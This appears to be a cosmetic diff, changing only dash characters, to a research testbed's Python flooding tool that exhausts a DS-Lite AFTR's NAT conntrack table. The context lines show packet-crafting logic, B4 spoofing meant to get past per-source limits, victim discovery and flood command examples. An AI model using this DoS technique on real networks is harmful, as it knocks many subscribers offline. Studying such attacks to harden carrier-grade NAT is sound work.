@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# T1 - NAT Binding Table Exhaustion
+# T1 – NAT Binding Table Exhaustion
 #
 # Attacker positions:
 #   (no --tunnel): IPv4-only LAN behind a B4 (e.g. 10.0.1.150), raw IPv4 packets forwarded
@@ -134,7 +134,7 @@ def resolve_mac_arp(iface, target_ip, src_ip):
 
 
 def resolve_mac_ndp(iface, dst_ip6):
-    """NDP resolution - ICMPv6 NS → NA."""
+    """NDP resolution – ICMPv6 NS → NA."""
     from scapy.layers.inet6 import ICMPv6ND_NS
     try:
         pkt = srp1(
@@ -324,7 +324,7 @@ class _TunnelBatch:
             # subscribers, using a different dport, stay reachable). Spreading
             # dport across the full range multiplies the reachable destination
             # endpoints so the global conntrack table fills to nf_conntrack_max
-            # (262144) - the real cross-subscriber DoS (RFC 6888). The UDP
+            # (262144) — the real cross-subscriber DoS (RFC 6888). The UDP
             # checksum is zeroed below and conntrack does not verify L4
             # checksums, so patching dport in place is safe.
             struct.pack_into('!H', buf, self._L4_SPORT, random.randint(1024, 65535))
@@ -340,7 +340,7 @@ class _TunnelBatch:
                                              bytes(buf[self._IPV4_DST: self._IPV4_DST + 4]),
                                              bytes(buf[74:94])))
             else:
-                # IPv4 UDP: setting checksum = 0 disables it (RFC 768) - valid and fast
+                # IPv4 UDP: setting checksum = 0 disables it (RFC 768) — valid and fast
                 struct.pack_into('!H', buf, self._UDP_CKSUM, 0)
 
             result.append(bytes(buf))
@@ -430,7 +430,7 @@ def preflight_test(iface, dmac, args):
         raw_pkts = build_batch_bytes(args, dmac, 1)
         sock.send(raw_pkts[0])
         sock.close()
-        print(f"[*] Preflight OK - test packet sent on {iface}.")
+        print(f"[*] Preflight OK – test packet sent on {iface}.")
         return True
     except OSError as e:
         sock.close()
@@ -459,7 +459,7 @@ def progress_printer(duration):
 
 def main():
     p = argparse.ArgumentParser(
-        description="T1 - NAT Binding Table Exhaustion\n"
+        description="T1 – NAT Binding Table Exhaustion\n"
                     "Floods unique TCP/UDP flows to exhaust AFTR conntrack table.\n\n"
                     "Uses raw AF_PACKET sockets for reliable, high-throughput sending.\n"
                     "Scapy is used only for packet building.",
@@ -471,9 +471,9 @@ Examples:
       --src-ip4 10.0.1.167 --gateway 10.0.1.1 \\
       --dst-ip4 198.51.100.2 --threads 8 --batch 256
 
-  # T1 fast flood from ISP - spoof many B4s + many inner clients:
-  # (Canonical default-mode attack path. RFC 6888 REQ-4 per-source cap -
-  # baked into the default nftables ruleset - prevents single-source LAN
+  # T1 fast flood from ISP – spoof many B4s + many inner clients:
+  # (Canonical default-mode attack path. RFC 6888 REQ-4 per-source cap —
+  # baked into the default nftables ruleset — prevents single-source LAN
   # floods from exhausting the pool. ISP spoofing of the inner IPv4 source
   # bypasses the per-source meter because each forged inner IP gets its
   # own 1000-connection budget. See paper/TRIALS_DEFAULT.md.)
@@ -482,7 +482,7 @@ Examples:
       --inner-src-prefix 10.0.0.0/16 --dst-ip4 198.51.100.2 \\
       --threads 8 --batch 256
 
-  # T1 fast flood from ISP - fixed single B4, random inner clients:
+  # T1 fast flood from ISP – fixed single B4, random inner clients:
   python3 nat_exhaustion.py eth-isp --tunnel \\
       --src-ip6 2001:db8:cafe::150 --aftr-ip6 2001:db8:cafe::10 \\
       --inner-src-prefix 10.0.0.0/16 --dst-ip4 198.51.100.2 \\
@@ -518,7 +518,7 @@ Monitor impact on AFTR (run inside AFTR netns):
                    help='Fixed destination IPv4 (default: 198.51.100.2)')
     p.add_argument('--dst-prefix',
                    help='Randomise destination IPv4 per packet from this CIDR '
-                        '(e.g. 198.51.100.0/24) - increases 5-tuple diversity.')
+                        '(e.g. 198.51.100.0/24) – increases 5-tuple diversity.')
 
     # ── Tunnel / ISP mode ──
     p.add_argument('--tunnel', action='store_true',
@@ -528,7 +528,7 @@ Monitor impact on AFTR (run inside AFTR netns):
                         'mutually exclusive with --src-ip6-prefix)')
     p.add_argument('--src-ip6-prefix',
                    help='Randomise outer IPv6 src per packet from this prefix '
-                        '(e.g. 2001:db8:cafe::/48) - spoofs many B4 subscribers.')
+                        '(e.g. 2001:db8:cafe::/48) – spoofs many B4 subscribers.')
     p.add_argument('--discover', action='store_true',
                    help='Tunnel mode: reconnaissance (passive sniff -> guess -> '
                         'active NDP) to find a victim B4 and forge its identity '
@@ -544,7 +544,7 @@ Monitor impact on AFTR (run inside AFTR netns):
                    help='Fixed inner IPv4 source for tunnel (default: 10.0.1.50)')
     p.add_argument('--inner-src-prefix',
                    help='Randomise inner IPv4 src per packet from this CIDR '
-                        '(e.g. 10.0.0.0/16) - greatly increases conntrack diversity.')
+                        '(e.g. 10.0.0.0/16) – greatly increases conntrack diversity.')
 
     # ── Common ──
     p.add_argument('--threads', type=int, default=8,
@@ -615,7 +615,7 @@ Monitor impact on AFTR (run inside AFTR netns):
         print(f"[*] Resolving NDP for AFTR {args.aftr_ip6} …")
         dmac = resolve_mac_ndp(args.interface, args.aftr_ip6)
         if not dmac:
-            print("[!] NDP failed - using multicast fallback 33:33:00:00:00:10")
+            print("[!] NDP failed – using multicast fallback 33:33:00:00:00:10")
             dmac = "33:33:00:00:00:10"
         print(f"[*] AFTR MAC: {dmac}")
     else:
@@ -624,7 +624,7 @@ Monitor impact on AFTR (run inside AFTR netns):
         print(f"[*] Resolving ARP for gateway {gw} (B4 LAN IP) …")
         dmac = resolve_mac_arp(args.interface, gw, src)
         if not dmac:
-            print(f"[!] ARP for {gw} failed - verify --gateway is the B4 LAN IP")
+            print(f"[!] ARP for {gw} failed – verify --gateway is the B4 LAN IP")
             print("[!] Using broadcast fallback ff:ff:ff:ff:ff:ff")
             dmac = "ff:ff:ff:ff:ff:ff"
         print(f"[*] Gateway (B4) MAC: {dmac}")
